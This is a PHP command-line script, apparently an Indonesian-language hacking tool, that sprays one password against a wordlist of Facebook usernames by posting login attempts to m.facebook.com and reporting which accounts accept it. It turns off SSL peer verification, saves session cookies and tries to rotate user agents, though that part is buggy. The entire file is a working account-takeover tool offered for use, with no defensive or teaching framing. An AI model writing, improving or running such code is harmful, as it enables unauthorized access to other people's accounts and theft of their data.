<?php
@system("clear");
error_reporting(0);
function mfb($pass, $user) {
	$fileua = 'user-agents.txt';
	$useragent = $fileua[rand(0, count($fileua) - 1)];
  $cookie = 'cookie.txt';
  touch ($cookie);
$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login.php');
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'pass='.$pass.'&email='.$user.'&login=Login');
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
	curl_setopt($ch, CURLOPT_REFERER, 'https://m.facebook.com');
	$output = curl_exec($ch) or die('Can\'t access '.$url);
	if(stristr($output, '<title>Facebook</title>') || stristr($output, 'id="checkpointSubmitButton"')) {
		return TRUE;
	} else {
		return FALSE;
	}
}
$file = $_SERVER[argv][0];
$pass = $_SERVER[argv][1];
$wordlist = $_SERVER[argv][2];
if(!empty($pass) && !empty($wordlist)) {
  $passlist = file($wordlist);
  $passcount = count($passlist);
  print "\n\e[1;31m[!] \e[1;32mMengecheck \e[1;35m".$passcount." \e[1;33muser..\n\e[0m";
  foreach($passlist as $password) {
    $user = substr($password, 0, strlen($password) - 1);
    if(mfb(urlencode($pass), urlencode($user))) {
      print "\n\e[1;33m".$user." : \e[1;32mOK\n";
    } else {
      print "\n\e[1;33m".$user." : \e[1;31mError\n\e[0m";
    }
  }
}
?>
